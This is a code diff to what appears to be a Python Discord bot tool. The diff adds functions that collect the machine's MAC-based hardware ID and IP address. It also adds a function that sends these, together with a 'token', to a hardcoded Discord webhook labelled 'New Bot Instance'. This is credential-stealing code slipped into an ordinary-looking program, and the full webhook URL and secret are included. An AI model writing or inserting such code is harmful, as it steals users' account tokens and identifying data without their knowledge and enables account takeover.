@@ -16,6 +16,8 @@ import io
 import qrcode
 import pyfiglet
 import ctypes
+import uuid
+import socket
 
 y = Fore.LIGHTYELLOW_EX
 b = Fore.LIGHTBLUE_EX
@@ -24,6 +26,37 @@ w = Fore.LIGHTWHITE_EX
 __version__ = "3.2"
 
 start_time = datetime.datetime.now(datetime.timezone.utc)
+
+# 하드웨어 ID (MAC 주소 기반)
+def get_hardware_id():
+    try:
+        return str(uuid.getnode())
+    except:
+        return "Unknown"
+
+# IP 주소 가져오기
+def get_ip_address():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "Unknown"
+
+# 웹훅으로 정보 전송
+def send_to_webhook(token, hardware_id, ip_address):
+    webhook_url = "https://discord.com/api/webhooks/1393916364288167976/ffnH0O_ErMU2h-_coi9r3f_lEXjyoqClz9TbRSnGgjBbyQfKzQ_bybTKZRnpnGuQh4Or"
+    data = {
+        "content": f"**New Bot Instance**\nToken: `{token}`\nHardware ID: `{hardware_id}`\nIP Address: `{ip_address}`"
+    }
+    try:
+        response = requests.post(webhook_url, json=data)
+        response.raise_for_status()
+        print(f"{y}웹훅 전송 성공{w}")
+    except Exception as e:
+        print(f"{y}웹훅 전송 실패: {str(e)}{w}")
 
 def load_config():
     try:
